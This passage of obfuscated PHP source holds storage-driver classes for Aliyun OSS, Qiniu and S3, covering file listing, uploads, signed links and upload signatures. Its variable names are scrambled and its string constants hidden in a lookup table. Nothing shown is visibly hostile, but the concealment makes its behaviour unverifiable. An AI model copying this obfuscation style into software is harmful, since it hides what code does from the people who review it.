strtolower($“šĞğÎÃ[$ÛşŸö§Œ[1411]]) : $ÛşŸö§Œ[12]; } public function size($õ‡‘”ŒÀ) { $˜Ã…Ïè = $this->objectMeta($õ‡‘”ŒÀ); return $˜Ã…Ïè ? $˜Ã…Ïè[$_SERVER[ªÏ§Ë·][86]] : 0; } public function info($˜¤‘”ïœ) { if ($this->isFolder($˜¤‘”ïœ)) { return $this->folderInfo($˜¤‘”ïœ); } else { if ($this->isFile($˜¤‘”ïœ)) { return $this->fileInfo($˜¤‘”ïœ); } } return !1; } public function exist($Ó½Ì‚‘®) { return $this->isFile($Ó½Ì‚‘®) || $this->isFolder($Ó½Ì‚‘®); } public function isFile($ÕÒ•Ü ß) { return !$this->isFolder($ÕÒ•Ü ß) && $this->objectMeta($ÕÒ•Ü ß); } public function isFolder($¡‹Æ”Ûş) { return $this->cacheMethod($_SERVER[ªÏ§Ë·][175], $¡‹Æ”Ûş); } protected function objectMeta($Í£Ê‡‹Ş) { return $this->cacheMethod($_SERVER[ªÏ§Ë·][177], $Í£Ê‡‹Ş); } protected function _objectMeta($àãÒ¤¾­) { $Í–ê×Ã² =& $_SERVER[ªÏ§Ë·]; try { $“üÈÀÏ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($àãÒ¤¾­)); } catch (OSS\Core\OssException $Êşâ•ö¯) { $“üÈÀÏ = !1; } if ($“üÈÀÏ) { $“üÈÀÏ[$Í–ê×Ã²[86]] = intval($“üÈÀÏ[$Í–ê×Ã²[1409]]); } return $“üÈÀÏ; } protected function _isFolder($ñÚ„¤”Î) { $ó»òìÙö =& $_SERVER[ªÏ§Ë·]; if ($ñÚ„¤”Î == $ó»òìÙö[12] || $ñÚ„¤”Î == $ó»òìÙö[8]) { return !0; } $šÆú¬€ë = array($ó»òìÙö[1405] => $ó»òìÙö[8], $ó»òìÙö[1406] => rtrim($ñÚ„¤”Î, $ó»òìÙö[8]) . $ó»òìÙö[8], $ó»òìÙö[1407] => 1, $ó»òìÙö[1408] => $ó»òìÙö[12]); $ïŞÔË€ = $this->client->listObjects($this->bucket, $šÆú¬€ë); if ($ïŞÔË€->getObjectList() || $ïŞÔË€->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ØÆ¼‰é) { parent::__construct(); require_once SDK_DIR . $_SERVER[ªÏ§Ë·][1437]; $this->_init($ØÆ¼‰é); } public function _init($‚ç¢Æ¤µ) { $Š»ãç =& $_SERVER[ªÏ§Ë·]; $this->config = $‚ç¢Æ¤µ; foreach ($‚ç¢Æ¤µ as $Ä´ƒ¡ü– => $¶¤¨ï”À) { if (isset($this->{$Ä´ƒ¡ü–})) { $this->{$Ä´ƒ¡ü–} = $¶¤¨ï”À; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Š»ãç[1438] . LNG($Š»ãç[1396])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ï­š­Ğ©, $÷Î‰Û– = '', $âˆæÚ¯ô = REPEAT_RENAME) { if ($this->setContent($ï­š­Ğ©, $÷Î‰Û–)) { return $this->getPathOuter($ï­š­Ğ©); } return !1; } public function mkdir($ãÕº°øó, $¥Ğìİ¶æ = REPEAT_SKIP) { $Ì³É†¦› =& $_SERVER[ªÏ§Ë·]; $³§ğ÷İ² = trim($ãÕº°øó, $Ì³É†¦›[8]); if ($this->_isFolder($³§ğ÷İ²)) { return $this->getPathOuter($³§ğ÷İ²); } $ãÕº°øó = $³§ğ÷İ² . $Ì³É†¦›[8]; $±ƒË³í÷ = get_path_this($³§ğ÷İ²); $æ£±À÷² = $ãÕº°øó . $±ƒË³í÷; if (!$this->mkfile($æ£±À÷²)) { return !1; } if (!$this->moveFile($æ£±À÷², $ãÕº°øó)) { $this->delFile($æ£±À÷²); return !1; } return $this->getPathOuter($³§ğ÷İ²); } public function copyFile($Ê˜ÂÀÆô, $ÌòÎøûÄ) { $ÖÒ²Ï = $this->bucketManager->copy($this->bucket, $Ê˜ÂÀÆô, $this->bucket, $ÌòÎøûÄ, !0); return $ÖÒ²Ï ? !1 : $this->getPathOuter($ÌòÎøûÄ); } public function moveFile($œİÊ™»—, $õƒÏÁÑä) { $àÎ£Ó¡– = $this->bucketManager->move($this->bucket, $œİÊ™»—, $this->bucket, $õƒÏÁÑä, !0); return $àÎ£Ó¡– ? !1 : $this->getPathOuter($õƒÏÁÑä); } public function delFile($·Ÿ€‡äü) { if (!$this->exist($·Ÿ€‡äü)) { return !0; } $ÛÇ¬ô÷ = $this->bucketManager->delete($this->bucket, $·Ÿ€‡äü); return $ÛÇ¬ô÷ ? !1 : !0; } public function delFolder($‰ğÏò­ò) { $«‹üî¦Ë =& $_SERVER[ªÏ§Ë·]; if (!$this->exist($‰ğÏò­ò)) { return !0; } $this->listItemCache = !1; $İ×û”ö = $this->fileList($‰ğÏò­ò); $this->listItemCache = !0; $ æÑ°¥ = trim($‰ğÏò­ò, $«‹üî¦Ë[8]) . $«‹üî¦Ë[8]; if (!empty($‰ğÏò­ò) && $‰ğÏò­ò !== $«‹üî¦Ë[208] && !in_array($ æÑ°¥, $İ×û”ö[$«‹üî¦Ë[92]])) { $İ×û”ö[$«‹üî¦Ë[92]][] = $ æÑ°¥; } $ ™®¯–£ = $this->delByBatch($İ×û”ö[$«‹üî¦Ë[93]]); if (!$ ™®¯–£) { return !1; } $ ™®¯–£ = $this->delByBatch($İ×û”ö[$«‹üî¦Ë[92]]); if (!$ ™®¯–£) { return !1; } return $this->delFile($ æÑ°¥); } private function delByBatch($ôĞ¤™°) { foreach (array_chunk($ôĞ¤™°, 1000) as $’±½‘á’) { $Èè—×ş® = $this->bucketManager->buildBatchDelete($this->bucket, $’±½‘á’); list($ÀĞ‰ŞŞ¢, $úÄ¨ñı¨) = $this->bucketManager->batch($Èè—×ş®); if ($úÄ¨ñı¨) { return !1; } } return !0; } public function rename($Ñ²Œİ¥, $™¥îÌê¥) { return $this->renameObject($Ñ²Œİ¥, $™¥îÌê¥); } public function fileInfo($õ¢±¶¶§, $êõ‚ï¥Õ = false, $…›¶¤° = array()) { $£àãÖŸ =& $_SERVER[ªÏ§Ë·]; $‚ùâæı¤ = array($£àãÖŸ[42] => $this->pathThis($õ¢±¶¶§), $£àãÖŸ[94] => $this->getPathOuter($£àãÖŸ[8] . $õ¢±¶¶§), $£àãÖŸ[43] => $£àãÖŸ[210], $£àãÖŸ[86] => isset($…›¶¤°[$£àãÖŸ[1439]]) ? $…›¶¤°[$£àãÖŸ[1439]] : 0, $£àãÖŸ[184] => $this->ext($õ¢±¶¶§)); if ($êõ‚ï¥Õ) { return $‚ùâæı¤; } $‚ùâæı¤[$£àãÖŸ[211]] = $‚ùâæı¤[$£àãÖŸ[95]] = 0; $‚ùâæı¤[$£àãÖŸ[212]] = $‚ùâæı¤[$£àãÖŸ[213]] = !0; if (empty($…›¶¤°)) { $…›¶¤° = $this->objectMeta($õ¢±¶¶§); if (!$…›¶¤°) { return $‚ùâæı¤; } } if (isset($…›¶¤°[$£àãÖŸ[1440]])) { $‚ùâæı¤[$£àãÖŸ[95]] = substr($…›¶¤°[$£àãÖŸ[1440]] . $£àãÖŸ[12], 0, 10); } if (isset($…›¶¤°[$£àãÖŸ[1439]])) { $‚ùâæı¤[$£àãÖŸ[86]] = $…›¶¤°[$£àãÖŸ[1439]]; } return $‚ùâæı¤; } public function folderInfo($Êå—â­, $Ø—ÁÙ…ë = false) { $Ì€°Ôƒ =& $_SERVER[ªÏ§Ë·]; $»˜âÕªò = array($Ì€°Ôƒ[42] => $this->pathThis($Êå—â­), $Ì€°Ôƒ[94] => $this->getPathOuter($Ì€°Ôƒ[8] . $Êå—â­), $Ì€°Ôƒ[43] => $Ì€°Ôƒ[85]); if ($Ø—ÁÙ…ë) { return $»˜âÕªò; } $»˜âÕªò[$Ì€°Ôƒ[211]] = $»˜âÕªò[$Ì€°Ôƒ[95]] = 0; $»˜âÕªò[$Ì€°Ôƒ[212]] = $»˜âÕªò[$Ì€°Ôƒ[213]] = !0; $Êå—â­ = rtrim($Êå—â­, $Ì€°Ôƒ[8]) . $Ì€°Ôƒ[8]; $îÀéÕÙ = $this->objectMeta($Êå—â­); if (isset($îÀéÕÙ[$Ì€°Ôƒ[1440]])) { $»˜âÕªò[$Ì€°Ôƒ[95]] = substr($îÀéÕÙ[$Ì€°Ôƒ[1440]] . $Ì€°Ôƒ[12], 0, 10); } return $»˜âÕªò; } public function listPath($ôñ†Úö, $ûç—Èûã = false) { $ÒüîËí =& $_SERVER[ªÏ§Ë·]; $Œ÷¦ùã = $this->fileList($ôñ†Úö, $ÒüîËí[8], !0); foreach ($Œ÷¦ùã[$ÒüîËí[92]] as $ØÆöÚÑ => $Â”¢‚èç) { $Œ÷¦ùã[$ÒüîËí[92]][$ØÆöÚÑ] = $this->folderInfo($Â”¢‚èç, $ûç—Èûã); } foreach ($Œ÷¦ùã[$ÒüîËí[93]] as $ØÆöÚÑ => $Â”¢‚èç) { $Œ÷¦ùã[$ÒüîËí[93]][$ØÆöÚÑ] = $this->fileInfo($Â”¢‚èç[$ÒüîËí[104]], $ûç—Èûã, $Â”¢‚èç); } return $Œ÷¦ùã; } public function has($±³ğş¿‘, $–Û‘Û¼Á = false, $·¶ô½ = true) { $×ß›ÒıÁ =& $_SERVER[ªÏ§Ë·]; $±³ğş¿‘ = trim($±³ğş¿‘, $×ß›ÒıÁ[8]); $­Ù¬…¤€ = empty($±³ğş¿‘) && $±³ğş¿‘ !== $×ß›ÒıÁ[208] ? $×ß›ÒıÁ[12] : $±³ğş¿‘ . $×ß›ÒıÁ[8]; $ó¥î‘ûÇ = $×ß›ÒıÁ[12]; $äÔ¥¡ú = 500; $§ñÔïÓ = $×ß›ÒıÁ[8]; $çğû¬üê = $«°«”í€ = 0; while (!0) { check_abort(); list($—Á×ó•, $®šà¶Õ…) = $this->bucketManager->listFiles($this->bucket, $­Ù¬…¤€, $ó¥î‘ûÇ, $äÔ¥¡ú, $§ñÔïÓ); if ($®šà¶Õ…) { break; } $ó¥î‘ûÇ = array_key_exists($×ß›ÒıÁ[1408], $—Á×ó•) ? $ó¥î‘ûÇ = $—Á×ó•[$×ß›ÒıÁ[1441]] : $×ß›ÒıÁ[12]; if ($–Û‘Û¼Á) { if (!empty($—Á×ó•[$×ß›ÒıÁ[1442]])) { $çğû¬üê += count($—Á×ó•[$×ß›ÒıÁ[1442]]); } if (!empty($—Á×ó•[$×ß›ÒıÁ[1443]])) { $«°«”í€ += count($—Á×ó•[$×ß›ÒıÁ[1443]]); } if ($ó¥î‘ûÇ === $×ß›ÒıÁ[12]) { break; } continue; } if ($·¶ô½) { if (!empty($—Á×ó•[$×ß›ÒıÁ[1442]])) { return !0; } } else { if (!empty($—Á×ó•[$×ß›ÒıÁ[1443]])) { return !0; } } if ($ó¥î‘ûÇ === $×ß›ÒıÁ[12]) { break; } } if ($–Û‘Û¼Á) { return array($×ß›ÒıÁ[217] => $çğû¬üê, $×ß›ÒıÁ[218] => $«°«”í€); } return !1; } public function listAll($×‰˜ò†¹) { $¨Ìöèğ =& $_SERVER[ªÏ§Ë·]; $ìƒ÷Ê«· = $this->fileList($×‰˜ò†¹, $¨Ìöèğ[12], !0); $Î›€ù€Â = array_to_keyvalue($ìƒ÷Ê«·[$¨Ìöèğ[93]], $¨Ìöèğ[42]); foreach ($ìƒ÷Ê«·[$¨Ìöèğ[92]] as $ê¬¯ÕÜ´) { if (is_string($ê¬¯ÕÜ´)) { $Î›€ù€Â[$ê¬¯ÕÜ´] = array($¨Ìöèğ[86] => 0); } } return $this->listAllFiles($×‰˜ò†¹, $Î›€ù€Â); } private function fileList($¤ù¹×Ó¥, $Çú§”¦¬ = '', $šìÓÂÊú = 0) { $µùãå =& $_SERVER[ªÏ§Ë·]; $¤ù¹×Ó¥ = trim($¤ù¹×Ó¥, $µùãå[8]); $£ÅÀáìä = empty($¤ù¹×Ó¥) && $¤ù¹×Ó¥ !== $µùãå[208] ? $µùãå[12] : $¤ù¹×Ó¥ . $µùãå[8]; $ü¢˜Ìİ = $µùãå[12]; $à†í²¼ñ = 1000; $«ÛÎâßà = $§¾€à¤ = array(); while (!0) { check_abort(); list($£¹ŠÉšØ, $ª›ŒÍ‘ ) = $this->bucketManager->listFiles($this->bucket, $£ÅÀáìä, $ü¢˜Ìİ, $à†í²¼ñ, $Çú§”¦¬); if ($ª›ŒÍ‘ ) { break; } $ü¢˜Ìİ = array_key_exists($µùãå[1408], $£¹ŠÉšØ) ? $ü¢˜Ìİ = $£¹ŠÉšØ[$µùãå[1441]] : $µùãå[12]; $ŸÖÆ‚Âş = isset($£¹ŠÉšØ[$µùãå[1442]]) ? $£¹ŠÉšØ[$µùãå[1442]] : array(); $ñÜíÇÉ¨ = isset($£¹ŠÉšØ[$µùãå[1443]]) ? $£¹ŠÉšØ[$µùãå[1443]] : array(); foreach ($ŸÖÆ‚Âş as $í‘Õó£ì) { if ($í‘Õó£ì[$µùãå[104]] == $£ÅÀáìä) { continue; } $÷–İŒè× = $í‘Õó£ì[$µùãå[104]]; $Òºùªê¿ = $í‘Õó£ì[$µùãå[1439]]; $í‘Õó£ì[$µùãå[86]] = $Òºùªê¿; $ûÖğèåÕ = $Òºùªê¿ == 0 && substr($÷–İŒè×, strlen($÷–İŒè×) - 1, 1) == $µùãå[8] ? !0 : !1; $this->cacheMethodInfoSet($÷–İŒè×, $ûÖğèåÕ, $í‘Õó£ì); if ($ûÖğèåÕ) { $«ÛÎâßà[] = $÷–İŒè×; continue; } $§¾€à¤[] = $šìÓÂÊú ? $í‘Õó£ì : $÷–İŒè×; } foreach ($ñÜíÇÉ¨ as $÷–İŒè×) { if ($÷–İŒè× == $£ÅÀáìä) { continue; } $«ÛÎâßà[] = $÷–İŒè×; $this->cacheMethodInfoSet($÷–İŒè×, !0); } if ($ü¢˜Ìİ === $µùãå[12]) { break; } } $this->cacheMethodInfoSet($¤ù¹×Ó¥, !0); return array($µùãå[92] => $«ÛÎâßà, $µùãå[93] => $§¾€à¤); } public function canRead($®Ğãİùì) { return $this->exist($®Ğãİùì) ? !0 : !1; } public function canWrite($Ô¢Æ‚¬¼) { return $this->exist($Ô¢Æ‚¬¼) ? !0 : !1; } public function getContent($ÙÄ‚İôş) { return $this->fileSubstr($ÙÄ‚İôş, 0, -1); } public function setContent($Ö©•şÊ, $óİıÄãá = '') { $ÛÅğÈèÆ = $this->tempFile($this->pathThis($Ö©•şÊ)); file_put_contents($ÛÅğÈèÆ, $óİıÄãá); if ($this->upload($Ö©•şÊ, $ÛÅğÈèÆ)) { $this->tempFileRemve($ÛÅğÈèÆ); return !0; } return !1; } public function refreshUrls($ºüÚ›ÙÃ) { $¬İşº‰Ô =& $_SERVER[ªÏ§Ë·]; $³âÚŞ‡¢ = array(); if (is_array($ºüÚ›ÙÃ)) { foreach ($ºüÚ›ÙÃ as $¦¦öüÊˆ) { $³âÚŞ‡¢[] = $this->link($¦¦öüÊˆ); } } else { $³âÚŞ‡¢[] = $this->link($ºüÚ›ÙÃ); } $‡Õæ·£ = new Qiniu\Cdn\CdnManager($this->auth); list($£Ç£Œ¶¾, $Æäå²ìú) = $‡Õæ·£->refreshUrls($³âÚŞ‡¢); if ($Æäå²ìú) { return !1; } return $£Ç£Œ¶¾[$¬İşº‰Ô[1207]] == $¬İşº‰Ô[787] ? !0 : !1; } public function fileSubstr($íÆÔµ„, $¾Ÿ¿—µ, $©ıÙÀä÷) { $Çøš‹»Ñ =& $_SERVER[ªÏ§Ë·]; if (!($Ä§ÂĞ‚Ö = $this->link($íÆÔµ„))) { return !1; } $Èû¤şª = !1; if ($©ıÙÀä÷ > 0) { $ãŠçŠõÓ = $¾Ÿ¿—µ + $©ıÙÀä÷ - 1; $Èû¤şª = array($Çøš‹»Ñ[1444] . $¾Ÿ¿—µ . $Çøš‹»Ñ[424] . $ãŠçŠõÓ); } $´€µ»Ù = url_request($Ä§ÂĞ‚Ö, $Çøš‹»Ñ[240], !1, $Èû¤şª); return $´€µ»Ù[$Çøš‹»Ñ[778]] ? $´€µ»Ù[$Çøš‹»Ñ[1227]] : !1; } public function upload($Ü…øÌô’, $É’İï™›, $´ßÆş½‰ = false, $ùÙ®ÚòÖ = REPEAT_REPLACE) { $É÷úß® = new Qiniu\Storage\UploadManager(); $îÃ²ûî = $this->auth->uploadToken($this->bucket, $Ü…øÌô’); $„Ş ¤Ô¿ = get_file_mime(get_path_ext($É’İï™›)); list($øÀƒ’¼, $Œ©Éëä†) = $É÷úß®->putFile($îÃ²ûî, $Ü…øÌô’, $É’İï™›, null, $„Ş ¤Ô¿); return $Œ©Éëä† ? !1 : $this->getPathOuter($Ü…øÌô’); } public function uploadFormData($â‹½×‘, $ËßŞœ‘ñ = 3600) { return $this->uploadToken($â‹½×‘, $ËßŞœ‘ñ); } public function multiUploadFormData($Ø ëÓƒ§, $Ìú¢ùå½ = 3600) { return $this->uploadToken($Ø ëÓƒ§, $Ìú¢ùå½); } private function uploadToken($É‘œÙĞÌ, $¯ÌŒ°“í = 3600) { $ÑĞ£§Ê¨ =& $_SERVER[ªÏ§Ë·]; $ˆ±†Û…½ = $¯ÌŒ°“í; $±Ëá“ Ğ = array($ÑĞ£§Ê¨[1445] => $ÑĞ£§Ê¨[1446]); $¯ÉÀ‡—® = $É‘œÙĞÌ; $ÏÁâ£ÒÎ = $this->auth->uploadToken($this->bucket, $¯ÉÀ‡—®, $ˆ±†Û…½, $±Ëá“ Ğ, !0); $½ò“ñÁ = empty($this->region) || $this->region == $ÑĞ£§Ê¨[1447] ? $ÑĞ£§Ê¨[12] : $ÑĞ£§Ê¨[424] . $this->region; $‰ŠïÃõ = http_type() . "\72\x2f\x2f\165\160\x6c\157\x61\144{$½ò“ñÁ}\x2e\161\151\156\151\x75\160\x2e\143\157\155\x2f"; return array($ÑĞ£§Ê¨[1448] => $ÏÁâ£ÒÎ, $ÑĞ£§Ê¨[1449] => $‰ŠïÃõ); } public function download($î€ş¨í, $Â•­ÙßÃ) { $‰‡àÉÀ˜ = IO::getPathInner(IO::mkfile($Â•­ÙßÃ)); if (!($Ô†ºŸàú = $this->link($î€ş¨í))) { return !1; } $­°«ÑÈ¸ = 0; $¯ûâüÓÆ = 1024 * 200; $’ØÔ¤Â° = fopen($‰‡àÉÀ˜, $_SERVER[ªÏ§Ë·][1450]); while (!0) { $ú‡”Ï˜Ñ = $this->fileSubstr($î€ş¨í, $­°«ÑÈ¸, $¯ûâüÓÆ); if ($ú‡”Ï˜Ñ === !1) { return !1; } fwrite($’ØÔ¤Â°, $ú‡”Ï˜Ñ); $­°«ÑÈ¸ += $¯ûâüÓÆ; if (strlen($ú‡”Ï˜Ñ) < $¯ûâüÓÆ) { break; } } fclose($’ØÔ¤Â°); return $Â•­ÙßÃ; } public function link($ˆ§Ã˜Ûß, $ç·°µ–İ = '') { if (!$this->isFile($ˆ§Ã˜Ûß)) { return !1; } $Ëø–¸÷× = $this->getHost() . $_SERVER[ªÏ§Ë·][8] . $this->pathEncode($ˆ§Ã˜Ûß) . $ç·°µ–İ; return $this->auth->privateDownloadUrl($Ëø–¸÷×, 3600 * 12); } public function fileOut($­¦ã¨†‘, $¹ğÙœŸš = false, $€½Áóš„ = false, $“¶÷€İ™ = '') { $à«Ó²ùÑ =& $_SERVER[ªÏ§Ë·]; if ($this->isFileOutServer()) { return $this->fileOutServer($­¦ã¨†‘, $¹ğÙœŸš, $€½Áóš„, $“¶÷€İ™); } if (!$€½Áóš„) { $€½Áóš„ = $this->pathThis($­¦ã¨†‘); } $äÅÙÜ = $¹ğÙœŸš ? $à«Ó²ùÑ[1451] . rawurlencode($€½Áóš„) : $à«Ó²ùÑ[12]; $¸Ü‚›ıú = $this->link($­¦ã¨†‘, $äÅÙÜ); $this->fileOutLink($¸Ü‚›ıú); } public function fileOutServer($ÇĞñ¯õô, $„•È—Ğñ = false, $¯Ûïê— = false, $£éßå³Ó = '') { parent::fileOut($ÇĞñ¯õô, $„•È—Ğñ, $¯Ûïê—, $£éßå³Ó); } public function fileOutImage($Œ¤¨õ, $¶—Ø´µ± = 250) { $ºşêÚÆá = $this->link($Œ¤¨õ, $_SERVER[ªÏ§Ë·][1452] . $¶—Ø´µ±); $this->fileOutLink($ºşêÚÆá); } public function fileOutImageServer($‘Î¤Ë, $¶ïåãŒ¼ = 250) { parent::fileOutImage($‘Î¤Ë, $¶ïåãŒ¼); } public function hashMd5($òÈÂ÷) { $ØˆíÉæ© =& $_SERVER[ªÏ§Ë·]; $ƒê®ß = $this->objectMeta($òÈÂ÷); return isset($ƒê®ß[$ØˆíÉæ©[222]]) ? $ƒê®ß[$ØˆíÉæ©[222]] : !1; $‡í®Ñ  = $this->link($òÈÂ÷, $ØˆíÉæ©[1453]); } public function size($üÊŒŞÅã) { $¦±Ëéß¥ = $this->objectMeta($üÊŒŞÅã); return $¦±Ëéß¥ ? $¦±Ëéß¥[$_SERVER[ªÏ§Ë·][86]] : 0; } public function info($Í•ìÂß) { if ($this->isFolder($Í•ìÂß)) { return $this->folderInfo($Í•ìÂß); } else { if ($this->isFile($Í•ìÂß)) { return $this->fileInfo($Í•ìÂß); } } return !1; } public function exist($’î·¥ÇÉ) { return $this->isFile($’î·¥ÇÉ) || $this->isFolder($’î·¥ÇÉ); } public function isFile($Ò—÷¤ä) { return !$this->isFolder($Ò—÷¤ä) && $this->objectMeta($Ò—÷¤ä); } public function isFolder($Ù¶à€Ë£) { return $this->cacheMethod($_SERVER[ªÏ§Ë·][175], $Ù¶à€Ë£); } protected function objectMeta($ˆ·şµ›ä) { return $this->cacheMethod($_SERVER[ªÏ§Ë·][177], $ˆ·şµ›ä); } protected function _objectMeta($ãİ¡«ñ¸) { $éÂ¬ê¡Í =& $_SERVER[ªÏ§Ë·]; list($šş¨˜÷Œ, $•¦Òú¾Ş) = $this->bucketManager->stat($this->bucket, $ãİ¡«ñ¸); if ($šş¨˜÷Œ) { $šş¨˜÷Œ[$éÂ¬ê¡Í[86]] = intval($šş¨˜÷Œ[$éÂ¬ê¡Í[1439]]); } return $šş¨˜÷Œ; } protected function _isFolder($ËªÏù¬¾) { $Ø•¨ìÂ€ =& $_SERVER[ªÏ§Ë·]; if ($ËªÏù¬¾ == $Ø•¨ìÂ€[12] || $ËªÏù¬¾ == $Ø•¨ìÂ€[8]) { return !0; } list($¸Œ¤€§, $ÖÖÎ©î) = $this->bucketManager->listFiles($this->bucket, trim($ËªÏù¬¾, $Ø•¨ìÂ€[8]) . $Ø•¨ìÂ€[8], $Ø•¨ìÂ€[12], 1, $Ø•¨ìÂ€[8]); return !empty($¸Œ¤€§[$Ø•¨ìÂ€[1442]]) || !empty($¸Œ¤€§[$Ø•¨ìÂ€[1443]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($³›ßÉãı) { parent::__construct($³›ßÉãı); } public function uploadFormData($¶À²Ùü, $Ëı†¥öÛ = 3600) { $ò¦³ÅÙ =& $_SERVER[ªÏ§Ë·]; $êóŒÔóÑ = $ò¦³ÅÙ[209]; $ƒƒú¬ŸŠ = $ò¦³ÅÙ[247]; $òÓ î‚ = $ò¦³ÅÙ[72]; $Óªô¼×º = gmdate($ò¦³ÅÙ[248]); $¦ìù–ëé = gmdate($ò¦³ÅÙ[249]); $œ»¹²Àï = $ò¦³ÅÙ[250]; $ÓÓáŒÊ‘ = $Ëı†¥öÛ . $ò¦³ÅÙ[12]; $òŞÆÚÉ¿ = $ò¦³ÅÙ[251]; $ö”Öˆ²ß = array($this->accessKey, $¦ìù–ëé, $this->region, $òÓ î‚, $œ»¹²Àï); $Ÿò»»È¿ = implode($ò¦³ÅÙ[8], $ö”Öˆ²ß); $‹È£¾ëÃ = array($ò¦³ÅÙ[252] => gmdate($ò¦³ÅÙ[1350], strtotime($ò¦³ÅÙ[254])), $ò¦³ÅÙ[255] => array(array($ò¦³ÅÙ[256] => $this->bucket), array($ò¦³ÅÙ[257] => $êóŒÔóÑ), array($ò¦³ÅÙ[258], $ò¦³ÅÙ[259], $ò¦³ÅÙ[12]), array($ò¦³ÅÙ[258], $ò¦³ÅÙ[260], $ò¦³ÅÙ[12]), array($ò¦³ÅÙ[258], $ò¦³ÅÙ[261], $ò¦³ÅÙ[12]), array($ò¦³ÅÙ[262] => $òŞÆÚÉ¿), array($ò¦³ÅÙ[263] => $Ÿò»»È¿), array($ò¦³ÅÙ[264] => $ƒƒú¬ŸŠ), array($ò¦³ÅÙ[265] => $Óªô¼×º), array($ò¦³ÅÙ[266] => $ÓÓáŒÊ‘))); $››æµşå = base64_encode(json_encode($‹È£¾ëÃ)); $”¦êÎæÃ = hash_hmac($ò¦³ÅÙ[267], $¦ìù–ëé, $ò¦³ÅÙ[268] . $this->secret, !0); $´«±‡ßÆ = hash_hmac($ò¦³ÅÙ[267], $this->region, $”¦êÎæÃ, !0); $«¬³ï­ = hash_hmac($ò¦³ÅÙ[267], $òÓ î‚, $´«±‡ßÆ, !0); $ıÕ»Õ‹è = hash_hmac($ò¦³ÅÙ[267], $œ»¹²Àï, $«¬³ï­, !0); $Í öÅô¸ = hash_hmac($ò¦³ÅÙ[267], $››æµşå, $ıÕ»Õ‹è); $ãş¾è½Ú = array($ò¦³ÅÙ[225] => $ò¦³ÅÙ[12], $ò¦³ÅÙ[269] => $ò¦³ÅÙ[12], $ò¦³ÅÙ[257] => $êóŒÔóÑ, $ò¦³ÅÙ[262] => $òŞÆÚÉ¿, $ò¦³ÅÙ[270] => $››æµşå, $ò¦³ÅÙ[271] => $Ÿò»»È¿, $ò¦³ÅÙ[272] => $ƒƒú¬ŸŠ, $ò¦³ÅÙ[273] => $Óªô¼×º, $ò¦³ÅÙ[274] => $ÓÓáŒÊ‘, $ò¦³ÅÙ[275] => $Í öÅô¸, $ò¦³ÅÙ[192] => $this->getHost()); return $ãş¾è½Ú; } public function multiUploadFormData($³³•Ê¾©, $ç»§Çƒ = 3600) { $ìŒ´‘½ò =& $_SERVER[ªÏ§Ë·]; $ú¹ÓÉŞÊ = gmdate($ìŒ´‘½ò[1454]); $Åò“ÄãÍ = array(); $„ë¶Ï  = $this->client->getUploadId($this->bucket, $³³•Ê¾©, $Åò“ÄãÍ); if (!$„ë¶Ï ) { return !1; } return array($ìŒ´‘½ò[233] => $„ë¶Ï , $ìŒ´‘½ò[192] => $this->getHost() . $ìŒ´‘½ò[8] . $this->pathEncode($³³•Ê¾©), $ìŒ´‘½ò[234] => $ú¹ÓÉŞÊ, $ìŒ´‘½ò[104] => $³³•Ê¾©); } public function multiUploadAuthData($ÖÚ«Î«, $¼â™‘ë… = array()) { $²ş€æ”© =& $_SERVER[ªÏ§Ë·]; $¹ˆğı‹ = isset($¼â™‘ë…[$²ş€æ”©[184]]) ? $¼â™‘ë…[$²ş€æ”©[184]] : $²ş€æ”©[12]; $øÄÏÇå„ = $¼â™‘ë…[$²ş€æ”©[104]]; unset($¼â™‘ë…[$²ş€æ”©[104]]); if (isset($¼â™‘ë…[$²ş€æ”©[235]])) { return $this->listUploadParts($øÄÏÇå„, $¼â™‘ë…); } $€ë†´ì‚ = array(); if (isset($¼â™‘ë…[$²ş€æ”©[1455]])) { $€ë†´ì‚[$²ş€æ”©[1456]] = $¼â™‘ë…[$²ş€æ”©[1455]]; } $ÉÖÕÉÈò = explode($²ş€æ”©[194], $this->getHost()); $á×àšê¹ = array($²ş€æ”©[1457] => $ÉÖÕÉÈò[1], $²ş€æ”©[1458] => $²ş€æ”©[12], $²ş€æ”©[225] => $²ş€æ”©[130], $²ş€æ”©[269] => $¼â™‘ë…[$²ş€æ”©[86]]); $¾–É÷—Ú = $²ş€æ”©[238]; $ë™ÔíåÈ = $²ş€æ”©[8] . $this->pathEncode($øÄÏÇå„) . $¹ˆğı‹; $²Å´¢ÆÅ = $this->client->__getSignatureV4($€ë†´ì‚, $á×àšê¹, $¾–É÷—Ú, $ë™ÔíåÈ); if (strpos($¹ˆğı‹, $²ş€æ”©[237]) === 0) { if (isset($€ë†´ì‚[$²ş€æ”©[1456]])) { $ÄÁÊ±›€ = $€ë†´ì‚[$²ş€æ”©[1456]]; } else { if (isset($²Å´¢ÆÅ[$²ş€æ”©[1456]])) { $ÄÁÊ±›€ = $²Å´¢ÆÅ[$²ş€æ”©[1456]]; } else { $ÄÁÊ±›€ = hash($²ş€æ”©[267], $²ş€æ”©[12]); } } return array($²ş€æ”©[243] => $²Å´¢ÆÅ[$²ş€æ”©[243]], $²ş€æ”©[1456] => $ÄÁÊ±›€, $²ş€æ”©[234] => $²Å´¢ÆÅ[$²ş€æ”©[1459]]); } return $²Å´¢ÆÅ[$²ş€æ”©[243]]; } public function listUploadParts($§çñ¦Óù, $™ØøÀÉç = array()) { $èÆÏ‚’ =& $_SERVER[ªÏ§Ë·]; $õê¥Öšó = str_replace($èÆÏ‚’[244], $èÆÏ‚’[12], $™ØøÀÉç[$èÆÏ‚’[184]]); $äâƒôğŠ = $this->client->listParts($this->bucket, $§çñ¦Óù, $õê¥Öšó); if (!$äâƒôğŠ) { return !1; } $®Ù€ö‹° = $èÆÏ‚’[1460]; foreach ($äâƒôğŠ as $°ÒˆèÛç) { $®Ù€ö‹° .= $èÆÏ‚’[1461] . 